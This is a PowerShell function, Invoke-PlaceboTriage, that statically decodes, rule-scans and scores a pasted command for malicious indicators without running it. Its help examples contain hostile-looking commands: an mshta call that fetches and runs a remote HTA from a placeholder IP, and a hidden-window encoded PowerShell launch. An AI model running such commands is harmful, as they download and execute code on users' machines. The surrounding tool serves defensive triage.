# placebo - Invoke-PlaceboTriage: static dissection of one paste-and-run command.

function Invoke-PlaceboTriage {
    <#
    .SYNOPSIS
        dissect a paste-and-run command without executing it.
    .DESCRIPTION
        normalize -> find decode candidates -> layered decode (base64/hex/charcode/url/
        entities/rot13, gzip/zlib inside) -> rule scan on original + every layer ->
        IOC extraction -> weighted score + verdict. nothing is ever run.
    .EXAMPLE
        Invoke-PlaceboTriage -Command 'powershell -w h -enc AAAA...'
        'mshta http://198.51.100.7/x.hta' | Invoke-PlaceboTriage
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory, Position = 0, ValueFromPipeline)][AllowEmptyString()][string]$Command,
        [string]$File,
        [int]$MaxDepth = 4,
        [switch]$Reveal,
        [switch]$Json
    )
    process {
        $raw = $Command
        if ($File) {
            $lines = Read-PlaceboTextFile -Path $File
            if ($null -eq $lines) { throw "cannot read file: $File" }
            $raw = ($lines -join "`n")
        }
        if ([string]::IsNullOrWhiteSpace($raw)) {
            return @{ Command = ''; Normalized = ''; Layers = @(); Score = 0; Verdict = 'clean'
                      Findings = @(); Iocs = (Get-PlaceboIocs -Text ''); DepthUsed = 0 }
        }

        $norm = Get-PlaceboNormalized -Text $raw
        $trace = Invoke-PlaceboDecode -Text $norm -MaxDepth $MaxDepth

        # scan original + every decoded layer text
        $layerFindings = @()
        $layerFindings += @{ Layer = 0; Findings = (Invoke-PlaceboRuleScan -Text $norm) }
        $layerIdx = 1
        foreach ($t in $trace) {
            $layerFindings += @{ Layer = $layerIdx; Findings = (Invoke-PlaceboRuleScan -Text $t.Text) }
            $layerIdx++
        }
        $scored = Invoke-PlaceboScore -LayerFindings $layerFindings

        # IOCs from original + layers
        $allText = $norm
        foreach ($t in $trace) { $allText += "`n" + $t.Text }
        $iocs = Get-PlaceboIocs -Text $allText

        $depthUsed = 0
        foreach ($t in $trace) { if ($t.Depth -gt $depthUsed) { $depthUsed = $t.Depth } }

        $layersOut = @()
        foreach ($t in $trace) {
            $layersOut += @{
                Depth = $t.Depth
                Kind  = $t.Kind
                Input = (Hide-PlaceboText -Text (Get-PlaceboTruncated -Text $t.Input -Max 96) -Reveal:$Reveal)
                Decoded = (Hide-PlaceboText -Text (Get-PlaceboTruncated -Text $t.Text -Max 400) -Reveal:$Reveal)
                FullDecoded = (Hide-PlaceboText -Text $t.Text -Reveal:$Reveal)
            }
        }

        $findingsOut = @()
        foreach ($f in $scored.Findings) {
            $findingsOut += @{
                Id = $f.Id; Name = $f.Name; Mitre = $f.Mitre; Weight = $f.Weight
                Count = $f.Count; Layers = @($f.Layers); Note = $f.Note
                Context = (Hide-PlaceboText -Text $f.Context -Reveal:$Reveal)
            }
        }

        return @{
            Command    = (Hide-PlaceboText -Text (Get-PlaceboTruncated -Text $raw -Max 300) -Reveal:$Reveal)
            Normalized = (Get-PlaceboTruncated -Text $norm -Max 300)
            Layers     = $layersOut
            Score      = $scored.Score
            Verdict    = $scored.Verdict
            Findings   = $findingsOut
            Iocs       = $iocs
            DepthUsed  = $depthUsed
        }
    }
}
